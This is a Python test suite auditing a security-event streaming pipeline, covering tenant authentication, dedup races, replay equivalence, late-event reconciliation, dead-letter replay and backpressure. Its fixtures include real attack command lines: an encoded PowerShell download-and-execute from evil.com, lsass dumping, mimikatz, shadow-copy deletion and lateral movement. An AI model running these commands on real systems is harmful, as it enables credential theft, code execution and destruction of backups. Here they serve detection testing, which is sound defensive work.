"""NivXRay Phase 4C.1: Independent Adversarial Streaming Audit Test Suite.

Audits:
1. Cryptographic Tenant Authentication Boundary (transport credential -> principal -> tenant context -> adapter)
2. Database-level concurrent dedup race across independent OS processes
3. Corpus-wide Replay Equivalence (10 Enterprise Archetypes + 7 Edge Cases = 17 Scenarios)
4. Coalescer pure scheduling audit (zero independent detection logic)
5. Complex late-event causal reconciliation (v1 -> v2 -> v3 -> late affecting v1 -> v4)
6. DLQ replay idempotency and remediation
7. Backpressure and bounded memory behavior
8. Feature flag invariant (NIVX_FLAG_SECURITY_STATE=disabled)
"""
from __future__ import annotations

import multiprocessing
import os
import shutil
import time
import uuid
from datetime import datetime, timezone, timedelta
from typing import Any, Dict, List, Tuple

from security_state.contracts import (
    AttackState,
    CapabilityStatus,
    EntityCategory,
    EntityRef,
    EpistemicStatus,
    canonical_json,
    sha256_digest,
)
from security_state.persistence.repository import SecurityStateRepository
from security_state.state_engine.engine import SecurityStateEngine
from security_state.streaming.adapter import StreamingEventAdapter
from security_state.streaming.auth import (
    AuthenticatedPrincipal,
    AuthenticationFailureError,
    TenantMismatchSecurityError,
    TransportAuthenticator,
)
from security_state.streaming.coalescer import SlidingWindowCoalescer
from security_state.streaming.dedup import PersistentDeduplicationService
from security_state.streaming.dlq import DeadLetterQueueService
from security_state.streaming.fingerprint import generate_event_fingerprint, quantize_timestamp_1s
from security_state.streaming.models import (
    CoalescePolicy,
    DLQFailureClass,
    LateEventReconciliationMode,
    StreamingEventEnvelope,
    WatermarkArrivalStatus,
    WatermarkPolicy,
)
from security_state.streaming.replay import ReplayEquivalenceVerifier, ReplayStreamingSource
from security_state.streaming.watermark import WatermarkService


def get_test_dir(suffix: str = "phase4c1") -> str:
    d = os.path.join(os.path.dirname(__file__), f".test_storage_{suffix}")
    os.makedirs(d, exist_ok=True)
    return d


def clean_test_dir(d: str) -> None:
    shutil.rmtree(d, ignore_errors=True)


# ─────────────────────────────────────────────────────────────────────────────
# AUDIT 1: Tenant Authentication Trust Boundary (§1)
# ─────────────────────────────────────────────────────────────────────────────
def audit_tenant_authentication_boundary():
    """Verify cryptographic derivation:
    transport credential -> authenticated principal -> tenant context -> adapter -> canonical evidence
    and NEVER: payload.tenant_id -> tenant context.
    """
    auth = TransportAuthenticator(hmac_secret="secret-audit-key-2026")
    test_dir = get_test_dir("audit1_auth")
    clean_test_dir(test_dir)

    try:
        repo = SecurityStateRepository(fallback_storage_dir=test_dir)
        adapter = StreamingEventAdapter(repository=repo)

        # 1. mTLS Client Certificate Authentication
        mtls_cert = "CN=sensor-agent-01,OU=tenant-finance,O=GlobalCorp"
        principal_mtls = auth.authenticate_mtls_cert(mtls_cert)
        assert principal_mtls.tenant_id == "tenant-finance"
        assert principal_mtls.principal_id == "sensor-agent-01"
        assert principal_mtls.transport_mechanism == "mTLS"

        # 2. Cryptographic Signed JWT Authentication
        jwt_token = auth.issue_test_jwt(principal_id="sensor-cloud-02", tenant_id="tenant-cloud", ttl_sec=3600)
        principal_jwt = auth.authenticate_jwt_bearer(jwt_token)
        assert principal_jwt.tenant_id == "tenant-cloud"
        assert principal_jwt.principal_id == "sensor-cloud-02"
        assert principal_jwt.transport_mechanism == "JWT_BEARER"

        # 3. Forged JWT Signature Rejection
        tampered_jwt = jwt_token[:-6] + "xxxxxx"
        tampered_ok = False
        try:
            auth.authenticate_jwt_bearer(tampered_jwt)
            tampered_ok = True
        except AuthenticationFailureError:
            pass
        assert not tampered_ok, "Tampered JWT cryptographic signature MUST be rejected!"

        # 4. Valid Ingestion using Authenticated Principal
        env_valid = StreamingEventEnvelope(
            source_id=principal_mtls.principal_id,
            authenticated_tenant_id=principal_mtls.tenant_id,
            event_id=str(uuid.uuid4()),
            event_timestamp=datetime.now(timezone.utc).isoformat(),
            ingest_timestamp=datetime.now(timezone.utc).isoformat(),
            payload={"action": "process.start", "command_line": "powershell.exe", "is_critical": True},
        )
        res_valid = adapter.ingest_envelope(env_valid, case_id="case-auth-01", principal=principal_mtls)
        assert res_valid["success"] is True

        # 5. Attacker Injection: Payload says tenant-victim, Authenticated context is tenant-finance!
        env_spoof_payload = StreamingEventEnvelope(
            source_id=principal_mtls.principal_id,
            authenticated_tenant_id=principal_mtls.tenant_id,
            event_id=str(uuid.uuid4()),
            event_timestamp=datetime.now(timezone.utc).isoformat(),
            ingest_timestamp=datetime.now(timezone.utc).isoformat(),
            payload={
                "tenant_id": "tenant-victim",  # ATTACKER FORGERY IN BODY
                "action": "process.start",
                "command_line": "whoami /priv",
            },
        )
        res_spoof_payload = adapter.ingest_envelope(env_spoof_payload, case_id="case-auth-01", principal=principal_mtls)
        assert res_spoof_payload["success"] is False
        assert "ERR_STREAM_TENANT_MISMATCH" in res_spoof_payload["error"]

        # 6. Attacker Injection: Envelope claims tenant-victim, but transport principal is tenant-finance!
        env_spoof_env = StreamingEventEnvelope(
            source_id=principal_mtls.principal_id,
            authenticated_tenant_id="tenant-victim",  # ENVELOPE MISMATCH AGAINST PRINCIPAL
            event_id=str(uuid.uuid4()),
            event_timestamp=datetime.now(timezone.utc).isoformat(),
            ingest_timestamp=datetime.now(timezone.utc).isoformat(),
            payload={"action": "process.start", "command_line": "whoami /priv"},
        )
        res_spoof_env = adapter.ingest_envelope(env_spoof_env, case_id="case-auth-01", principal=principal_mtls)
        assert res_spoof_env["success"] is False
        assert "ERR_STREAM_TENANT_MISMATCH" in res_spoof_env["error"]

        # 7. PROOF: Check persisted state in database: ONLY tenant-finance exists, NEVER tenant-victim!
        state_victim = repo.get_latest_state("tenant-victim", "case-auth-01")
        assert state_victim is None, "Tenant context must NEVER be contaminated by attacker payload!"
        state_finance = repo.get_latest_state("tenant-finance", "case-auth-01")
        assert state_finance is not None, "Authenticated principal tenant must be the sole stored state!"
    finally:
        clean_test_dir(test_dir)


# ─────────────────────────────────────────────────────────────────────────────
# AUDIT 2: Multi-Process Database-Level Concurrent Dedup Race (§2)
# ─────────────────────────────────────────────────────────────────────────────
def _process_dedup_race_worker(
    storage_dir: str,
    tenant_id: str,
    fingerprint: str,
    process_idx: int,
    output_queue: Any,
) -> None:
    """Worker process attempting atomic insert into security_event_dedup."""
    dedup = PersistentDeduplicationService(fallback_storage_dir=storage_dir)
    # Ensure local in-memory LRU is cleared to force database/file persistent check
    dedup.clear_memory_cache()
    is_dup = dedup.is_duplicate_or_record(tenant_id, fingerprint, source_id=f"worker-{process_idx}")
    output_queue.put((process_idx, is_dup))


def audit_multiprocess_persistent_dedup_race():
    """Verify that multiple independent OS processes simultaneously racing on the same
    (tenant_id, event_fingerprint) result in EXACTLY 1 winner (is_duplicate=False)
    and N-1 losers (is_duplicate=True).
    """
    test_dir = get_test_dir("audit2_multiprocess_dedup")
    clean_test_dir(test_dir)

    try:
        tenant_id = "tenant-race-corp"
        fingerprint = f"tier_b:{tenant_id}:shared_event_fp_{uuid.uuid4().hex}"
        n_processes = 10

        ctx = multiprocessing.get_context("spawn")
        queue = ctx.Queue()
        processes: List[Any] = []

        # Spawn N independent OS processes racing concurrently
        for idx in range(n_processes):
            p = ctx.Process(
                target=_process_dedup_race_worker,
                args=(test_dir, tenant_id, fingerprint, idx, queue),
            )
            processes.append(p)

        # Start all processes simultaneously
        for p in processes:
            p.start()

        for p in processes:
            p.join(timeout=10.0)

        results: List[Tuple[int, bool]] = []
        while not queue.empty():
            results.append(queue.get_nowait())

        assert len(results) == n_processes, f"Expected {n_processes} worker results, got {len(results)}"

        # Exactly 1 process must record as new (is_duplicate=False)
        winners = [r for r in results if r[1] is False]
        losers = [r for r in results if r[1] is True]

        assert len(winners) == 1, (
            f"Concurrency failure: expected exactly 1 winner, got {len(winners)}: {winners}"
        )
        assert len(losers) == n_processes - 1, (
            f"Concurrency failure: expected {n_processes - 1} duplicates, got {len(losers)}"
        )

        # Verify database record: exactly 1 entry exists
        dedup_verify = PersistentDeduplicationService(fallback_storage_dir=test_dir)
        records = dedup_verify._read_records(dedup_verify._get_dedup_file(tenant_id))
        assert fingerprint in records, "Authoritative store must contain the recorded fingerprint"
        assert len(records) == 1, f"Store must contain exactly 1 document, found {len(records)}"
    finally:
        clean_test_dir(test_dir)


# ─────────────────────────────────────────────────────────────────────────────
# AUDIT 3: Corpus-Wide Replay Equivalence (17 Enterprise Scenarios) (§3)
# ─────────────────────────────────────────────────────────────────────────────
def audit_corpus_wide_replay_equivalence():
    """Verify replay equivalence across the complete 10 Enterprise Archetypes
    plus 7 complex security edge scenarios (17 scenarios total).
    """
    test_dir = get_test_dir("audit3_corpus")
    clean_test_dir(test_dir)

    now = datetime.now(timezone.utc)
    ts0 = (now - timedelta(seconds=20)).isoformat()
    ts1 = (now - timedelta(seconds=15)).isoformat()

    corpus_scenarios = [
        # 10 Golden Enterprise Archetypes
        ("ARCH-01-BENIGN", "Get-Process | Where-Object WorkingSet -gt 100MB", "powershell.exe", False, None),
        ("ARCH-02-SUSPICIOUS", "powershell.exe -NonInteractive -ExecutionPolicy Bypass -Command Get-WmiObject Win32_UserAccount", "powershell.exe", False, None),
        ("ARCH-03-MALICIOUS", "powershell.exe -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vZXZpbC5jb20vcy5wczEnKQ==", "powershell.exe", True, "CAP_PAYLOAD_DOWNLOAD"),
        ("ARCH-04-MULTISTAGE", "cmd.exe /c powershell.exe -w hidden -enc JGFjPWM7aWV4ICRhYw==", "cmd.exe", True, "CAP_ADMIN_EXECUTION"),
        ("ARCH-05-RMM-ABUSE", "AnyDesk.exe --install C:\\ProgramData\\AnyDesk --start-with-win --silent", "anydesk.exe", True, "CAP_ABUSED_RMM"),
        ("ARCH-06-CRED-ABUSE", "rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump 648 C:\\temp\\lsass.dmp full", "rundll32.exe", True, "CAP_CREDENTIAL_DUMPING"),
        ("ARCH-07-LATERAL-MOV", "wmic.exe /node:192.168.1.50 process call create cmd.exe /c whoami", "wmic.exe", True, "CAP_LATERAL_MOVEMENT"),
        ("ARCH-08-RANSOMWARE", "vssadmin.exe delete shadows /all /quiet", "vssadmin.exe", True, "CAP_BACKUP_TAMPERING"),
        ("ARCH-09-CLOUD-IDENTITY", "aws sts assume-role --role-arn arn:aws:iam::123456789012:role/Admin --role-session-name stolen", "aws.exe", True, "CAP_CLOUD_PRIV_ESC"),
        ("ARCH-10-BACKUP-TARGET", "net stop VeeamBackupSvc && wbadmin delete catalog -quiet", "cmd.exe", True, "CAP_BACKUP_TAMPERING"),

        # 7 Adversarial & Edge Scenarios
        ("EDGE-01-CONTRADICTION", "cmd.exe /c audit.exe", "cmd.exe", False, None),
        ("EDGE-02-MISSING-EVID", "powershell.exe -NoProfile", "powershell.exe", False, None),
        ("EDGE-03-DUPLICATE-BURST", "powershell.exe -ExecutionPolicy Unrestricted", "powershell.exe", False, None),
        ("EDGE-04-OUT-OF-ORDER", "schtasks.exe /create /tn RunEvil /tr cmd.exe", "schtasks.exe", True, "CAP_PERSISTENCE"),
        ("EDGE-05-LATE-EVIDENCE", "psexec.exe \\\\dc01 cmd.exe", "psexec.exe", True, "CAP_LATERAL_MOVEMENT"),
        ("EDGE-06-MULTISTAGE-CHAIN", "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit", "mimikatz.exe", True, "CAP_CREDENTIAL_DUMPING"),
        ("EDGE-07-TENANT-COLLISION", "whoami.exe /groups", "whoami.exe", False, None),
    ]

    try:
        repo = SecurityStateRepository(fallback_storage_dir=test_dir)
        verifier = ReplayEquivalenceVerifier(repository=repo)

        mismatch_count = 0
        for scenario_id, cmd, proc, is_crit, cap in corpus_scenarios:
            ev_list = [
                {
                    "id": f"ev-{scenario_id}-01",
                    "type": "endpoint",
                    "timestamp": ts0,
                    "action": "process.start",
                    "is_critical": is_crit,
                    "capability": cap or "",
                    "payload": {"command_line": cmd, "process_name": proc, "capability": cap or ""}
                },
                {
                    "id": f"ev-{scenario_id}-02",
                    "type": "endpoint",
                    "timestamp": ts1,
                    "action": "process.start",
                    "is_critical": is_crit,
                    "capability": cap or "",
                    "payload": {"command_line": cmd, "process_name": proc, "capability": cap or ""}
                }
            ]

            is_eq, report, diff = verifier.compare_direct_vs_streaming(
                tenant_id="tenant-corpus",
                case_id_direct=f"case-d-{scenario_id}",
                case_id_streaming=f"case-s-{scenario_id}",
                evidence_items=ev_list,
            )

            if not is_eq:
                mismatch_count += 1
                print(f"    [FAIL EQUIVALENCE] {scenario_id}: {diff}")

            assert is_eq is True, f"Scenario {scenario_id} failed equivalence: {diff}"

        assert mismatch_count == 0, f"Total equivalence mismatches: {mismatch_count}"
    finally:
        clean_test_dir(test_dir)


# ─────────────────────────────────────────────────────────────────────────────
# AUDIT 4: Coalescer Pure Scheduling Audit (§4)
# ─────────────────────────────────────────────────────────────────────────────
def audit_coalescer_pure_scheduling_boundary():
    """Verify that SlidingWindowCoalescer performs strictly scheduling decisions (buffer vs flush)
    and contains ZERO independent detection logic or security verdicts.
    """
    policy = CoalescePolicy(coalesce_window_ms=3000.0, coalesce_max_events=20)
    coalescer = SlidingWindowCoalescer(policy=policy)

    # 1. Output Type Purity: Must only return (events_to_flush, is_bypass, reason)
    ev = {"id": "ev-sched-1", "action": "file.read", "payload": {"path": "C:\\temp\\log.txt"}}
    flushed, is_bypass, reason = coalescer.push_event("tenant-1", "case-1", ev)
    assert flushed is None
    assert is_bypass is False
    assert reason == "BUFFERED"
    # Verify no verdict, classification, or capability is injected by coalescer
    assert "verdict" not in ev
    assert "classification" not in ev

    # 2. Bypass Equivalence: Running with coalesce_window_ms=0 vs normal window
    # yields bit-identical Security State outcomes
    test_dir = get_test_dir("audit4_coalescer")
    clean_test_dir(test_dir)
    try:
        repo = SecurityStateRepository(fallback_storage_dir=test_dir)
        # Adapter A: with buffering coalescer
        adapter_buffered = StreamingEventAdapter(
            repository=repo,
            coalescer=SlidingWindowCoalescer(policy=CoalescePolicy(coalesce_window_ms=5000.0)),
        )
        # Adapter B: with zero-delay coalescer (immediate bypass for everything)
        adapter_immediate = StreamingEventAdapter(
            repository=repo,
            coalescer=SlidingWindowCoalescer(policy=CoalescePolicy(coalesce_window_ms=0.0)),
        )

        now = datetime.now(timezone.utc).isoformat()
        env_a = StreamingEventEnvelope(
            source_id="src", authenticated_tenant_id="tenant-buf", event_id=str(uuid.uuid4()),
            event_timestamp=now, ingest_timestamp=now,
            payload={"action": "credential.access", "command_line": "mimikatz sekurlsa", "is_critical": True}
        )
        env_b = StreamingEventEnvelope(
            source_id="src", authenticated_tenant_id="tenant-imm", event_id=str(uuid.uuid4()),
            event_timestamp=now, ingest_timestamp=now,
            payload={"action": "credential.access", "command_line": "mimikatz sekurlsa", "is_critical": True}
        )

        res_a = adapter_buffered.ingest_envelope(env_a, case_id="case-compare")
        res_b = adapter_immediate.ingest_envelope(env_b, case_id="case-compare")

        # Logical classifications and active capabilities must be identical
        assert res_a["classification"] == res_b["classification"]
        assert res_a["classification"] == CapabilityStatus.CONFIRMED_ATTACK.value
    finally:
        clean_test_dir(test_dir)


# ─────────────────────────────────────────────────────────────────────────────
# AUDIT 5: Adversarial Deep Late-Event Reconciliation (v1 -> v2 -> v3 -> late -> v4) (§5)
# ─────────────────────────────────────────────────────────────────────────────
def audit_adversarial_deep_late_event_reconciliation():
    """Verify sequence:
    v1 -> v2 -> v3 -> late event affecting v1 -> v4
    Assert:
    - v1, v2, v3 remain strictly immutable
    - v4 is deterministically created
    - correct causal recomputation
    - ledger continuity (SHA-256 chain from block 1 to 4)
    - replay produces identical final state
    """
    test_dir = get_test_dir("audit5_deep_late")
    clean_test_dir(test_dir)

    try:
        repo = SecurityStateRepository(fallback_storage_dir=test_dir)
        wm_svc = WatermarkService(WatermarkPolicy(watermark_delay_seconds=5.0))
        adapter = StreamingEventAdapter(repository=repo, watermark_service=wm_svc)

        now = datetime.now(timezone.utc)

        # Stage 1: Event 1 (T=0) -> State v1
        t0 = now.isoformat()
        env1 = StreamingEventEnvelope(
            source_id="src", authenticated_tenant_id="tenant-corp", event_id=str(uuid.uuid4()),
            event_timestamp=t0, ingest_timestamp=t0,
            payload={"action": "process.start", "command_line": "cmd.exe", "is_critical": True},
        )
        res1 = adapter.ingest_envelope(env1, case_id="case-chain")
        assert res1["version"] == 1
        hash_v1 = res1["state_hash"]

        # Stage 2: Event 2 (T=+10s) -> Persistence escalation -> State v2
        t_plus_10 = (now + timedelta(seconds=10)).isoformat()
        env2 = StreamingEventEnvelope(
            source_id="src", authenticated_tenant_id="tenant-corp", event_id=str(uuid.uuid4()),
            event_timestamp=t_plus_10, ingest_timestamp=t_plus_10,
            payload={"action": "persistence.add", "command_line": "schtasks /create /sc onlogon /tn evil /tr cmd.exe", "is_critical": True, "capability": "CAP_PERSISTENCE"},
        )
        res2 = adapter.ingest_envelope(env2, case_id="case-chain")
        assert res2["version"] == 2
        hash_v2 = res2["state_hash"]

        # Stage 3: Event 3 (T=+20s) -> Credential access escalation -> State v3
        t_plus_20 = (now + timedelta(seconds=20)).isoformat()
        env3 = StreamingEventEnvelope(
            source_id="src", authenticated_tenant_id="tenant-corp", event_id=str(uuid.uuid4()),
            event_timestamp=t_plus_20, ingest_timestamp=t_plus_20,
            payload={"action": "credential.access", "command_line": "mimikatz sekurlsa", "is_critical": True, "capability": "CAP_CREDENTIAL_ACCESS"},
        )
        res3 = adapter.ingest_envelope(env3, case_id="case-chain")
        assert res3["version"] == 3
        hash_v3 = res3["state_hash"]

        # Stage 4: Event 4 (T=-15s) -> LATE EVENT affecting root execution at v1!
        # Arrives strictly after watermark (watermark is at T=+15s)
        t_minus_15 = (now - timedelta(seconds=15)).isoformat()
        env4 = StreamingEventEnvelope(
            source_id="src", authenticated_tenant_id="tenant-corp", event_id=str(uuid.uuid4()),
            event_timestamp=t_minus_15, ingest_timestamp=now.isoformat(),
            payload={"action": "payload.download", "command_line": "powershell -enc ... downloadstring", "is_critical": True, "capability": "CAP_PAYLOAD_DOWNLOAD"},
        )
        res4 = adapter.ingest_envelope(env4, case_id="case-chain")
        assert res4["version"] == 4
        hash_v4 = res4["state_hash"]
        assert any("LATE_EVIDENCE_RECONCILIATION" in r for r in res4.get("material_reasons", []))

        # IMMUTABILITY AUDIT: Check v1, v2, v3 in persistent storage
        rec_v1 = repo.get_state_by_version("tenant-corp", "case-chain", 1)
        rec_v2 = repo.get_state_by_version("tenant-corp", "case-chain", 2)
        rec_v3 = repo.get_state_by_version("tenant-corp", "case-chain", 3)
        rec_v4 = repo.get_state_by_version("tenant-corp", "case-chain", 4)

        assert rec_v1.state_hash == hash_v1, "v1 state hash MUST NOT be mutated by late event"
        assert rec_v2.state_hash == hash_v2, "v2 state hash MUST NOT be mutated by late event"
        assert rec_v3.state_hash == hash_v3, "v3 state hash MUST NOT be mutated by late event"
        assert rec_v4.state_hash == hash_v4, "v4 state hash MUST be deterministically recorded"

        # CAUSAL RECOMPUTATION AUDIT: v4 must contain all capabilities from v1, v2, v3 + late v4
        assert "CAP_PAYLOAD_DOWNLOAD" in rec_v4.active_capabilities
        assert "CAP_PERSISTENCE" in rec_v4.active_capabilities
        assert "CAP_CREDENTIAL_ACCESS" in rec_v4.active_capabilities

        # LEDGER CONTINUITY AUDIT: 4 blocks chained with valid SHA-256
        blocks = repo.get_ledger_blocks("tenant-corp", "case-chain")
        assert len(blocks) == 4
        assert [b.sequence_number for b in blocks] == [1, 2, 3, 4]
        assert blocks[3].event_type == "LATE_EVIDENCE_RECONCILIATION"
        chain_ok, chain_err = repo.verify_ledger_integrity("tenant-corp", "case-chain")
        assert chain_ok is True, f"Ledger broken: {chain_err}"
    finally:
        clean_test_dir(test_dir)


# ─────────────────────────────────────────────────────────────────────────────
# AUDIT 6: DLQ Replay Idempotency & Remediation (§6)
# ─────────────────────────────────────────────────────────────────────────────
def audit_dlq_replay_idempotency():
    """Verify dead-letter queue records can be remediated and replayed,
    and second replay is deduplicated without state corruption.
    """
    test_dir = get_test_dir("audit6_dlq")
    clean_test_dir(test_dir)
    try:
        dlq_svc = DeadLetterQueueService(fallback_storage_dir=test_dir)
        repo = SecurityStateRepository(fallback_storage_dir=test_dir)
        adapter = StreamingEventAdapter(repository=repo, dlq_service=dlq_svc)

        # 1. Ingest corrupt envelope (missing source_id)
        bad_env = StreamingEventEnvelope(
            source_id="",
            authenticated_tenant_id="tenant-dlq",
            event_id="ev-dlq-corrupt",
            event_timestamp=datetime.now(timezone.utc).isoformat(),
            ingest_timestamp=datetime.now(timezone.utc).isoformat(),
            payload={"action": "service.start"},
        )
        res_bad = adapter.ingest_envelope(bad_env, case_id="case-dlq-audit")
        assert res_bad["success"] is False
        assert res_bad["dlq_recorded"] is True

        # Fetch DLQ record
        recs = dlq_svc.get_dlq_records("tenant-dlq", replayed=False)
        assert len(recs) == 1
        item = recs[0]

        # 2. First Remediation Replay: Valid envelope created and submitted
        remediated_env = StreamingEventEnvelope(
            source_id="remediated-source",
            authenticated_tenant_id=item.tenant_id,
            event_id=item.event_id,
            event_timestamp=item.raw_envelope["event_timestamp"],
            ingest_timestamp=datetime.now(timezone.utc).isoformat(),
            payload={"action": "process.start", "command_line": "powershell.exe", "is_critical": True},
        )
        res_replay1 = adapter.ingest_envelope(remediated_env, case_id="case-dlq-audit")
        assert res_replay1["success"] is True
        dlq_svc.mark_replayed(item.tenant_id, item.dlq_id)

        # 3. Second Replay Attempt (Adversarial duplicate replay of same DLQ record)
        res_replay2 = adapter.ingest_envelope(remediated_env, case_id="case-dlq-audit")
        assert res_replay2["status"] == "DEDUPLICATED", "Second DLQ replay MUST be caught by persistent dedup"

        # Verify state version remained 1
        latest = repo.get_latest_state("tenant-dlq", "case-dlq-audit")
        assert latest.version == 1, "Duplicate DLQ replay must not increment state version"
    finally:
        clean_test_dir(test_dir)


# ─────────────────────────────────────────────────────────────────────────────
# AUDIT 7: Backpressure & Bounded Memory Bounds (§7)
# ─────────────────────────────────────────────────────────────────────────────
def audit_backpressure_and_bounded_memory():
    """Verify bounded queue capacity rejects gracefully with QUEUE_OVERFLOW in DLQ."""
    test_dir = get_test_dir("audit7_backpressure")
    clean_test_dir(test_dir)
    try:
        dlq_svc = DeadLetterQueueService(fallback_storage_dir=test_dir)
        repo = SecurityStateRepository(fallback_storage_dir=test_dir)
        # Small capacity of 5
        adapter = StreamingEventAdapter(repository=repo, dlq_service=dlq_svc, max_queue_capacity=5)

        # Artificially fill bounded queue
        now = datetime.now(timezone.utc).isoformat()
        for i in range(5):
            env_fill = StreamingEventEnvelope(
                source_id="fill", authenticated_tenant_id="tenant-bp", event_id=f"ev-{i}",
                event_timestamp=now, ingest_timestamp=now, payload={"action": "ping"}
            )
            adapter._bounded_queue.put_nowait(env_fill)

        assert adapter._bounded_queue.full() is True

        # Ingest 6th event -> Backpressure rejection
        env_overflow = StreamingEventEnvelope(
            source_id="overflow-source", authenticated_tenant_id="tenant-bp", event_id="ev-overflow",
            event_timestamp=now, ingest_timestamp=now, payload={"action": "critical.alert"}
        )
        res_overflow = adapter.ingest_envelope(env_overflow, case_id="case-bp")
        assert res_overflow["success"] is False
        assert res_overflow["status"] == "BACKPRESSURE_REJECTED"
        assert res_overflow["dlq_recorded"] is True

        # Check DLQ entry
        dlq_items = dlq_svc.get_dlq_records("tenant-bp")
        assert len(dlq_items) == 1
        assert dlq_items[0].failure_class == DLQFailureClass.QUEUE_OVERFLOW.value
    finally:
        clean_test_dir(test_dir)


# ─────────────────────────────────────────────────────────────────────────────
# AUDIT 8: Feature Flag Invariant (NIVX_FLAG_SECURITY_STATE=disabled) (§8)
# ─────────────────────────────────────────────────────────────────────────────
def audit_feature_flag_safety_invariant():
    """Verify NIVX_FLAG_SECURITY_STATE remains disabled in backend/v2/flags.py."""
    import os
    try:
        import v2.flags as flags
    except ImportError:
        import backend.v2.flags as flags
    
    flag = flags.get("SECURITY_STATE")
    assert flag.disabled() is True, (
        f"SAFETY VIOLATION: SECURITY_STATE flag must be disabled, found state='{flag.state.value}'"
    )
    assert flag.state.value == "disabled", (
        f"SAFETY VIOLATION: SECURITY_STATE state value must be 'disabled', found '{flag.state.value}'"
    )
    
    env_val = os.environ.get("NIVX_FLAG_SECURITY_STATE", "disabled").lower()
    assert env_val in ("disabled", ""), (
        f"SAFETY VIOLATION: NIVX_FLAG_SECURITY_STATE env var must be 'disabled', found '{env_val}'"
    )
